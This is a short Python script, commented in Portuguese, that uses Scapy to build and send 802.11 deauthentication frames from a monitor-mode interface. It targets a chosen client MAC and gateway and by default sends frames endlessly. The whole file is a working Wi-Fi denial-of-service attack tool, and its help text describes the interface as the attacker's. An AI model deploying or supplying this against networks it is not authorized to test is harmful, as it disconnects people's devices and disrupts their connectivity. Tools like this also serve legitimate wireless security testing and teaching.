from scapy.all import *

def deauth(target_mac, gateway_mac, inter=0.1, count=None, loop=1, iface="wlan0mon", verbose=1):

    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    # empilhando
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    # enviando o pacote.
    sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)

if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="ferramenta desenvolvida por w4lipara enviar pacotes de desautenticação.")
    parser.add_argument("target", help="endereço mac alvo para desautenticar..")
    parser.add_argument("gateway", help="endereço MAC do gateway cujo o alvo esteja conectado.")
    parser.add_argument("-c" , "--count", help="quantidade de frames para ser enviado ao alvo, especifique 0 para enviar infinitamente, o padrão é 0.", default=0) 
    parser.add_argument("--interval", help="a frequencia de compartilhamento entre dois frames, o padrão é 100ms", default=0.1)
    parser.add_argument("-i", dest="iface", help="nome da interface de rede do atacante, é necessario que esteja em modo monitor, o padrão é 'wlan0mon'", default="wlan0mon")
    parser.add_argument("-v", "--verbose", help="para imprimir mensagens", action="store_true")

    args = parser.parse_args()
    target = args.target
    gateway = args.gateway
    count = int(args.count)
    interval = float(args.interval)
    iface = args.iface
    verbose = args.verbose
    if count == 0:
	
	
        loop = 1
        count = None
    else:
        loop = 0


    if verbose:
        if count:
            print(f"[+] enviando {count} frames a cada {interval}s...")
        else:
            print(f"[+]  enviando frames {interval}s para sempre :) ...")

    deauth(target, gateway, interval, count, loop, iface, verbose)
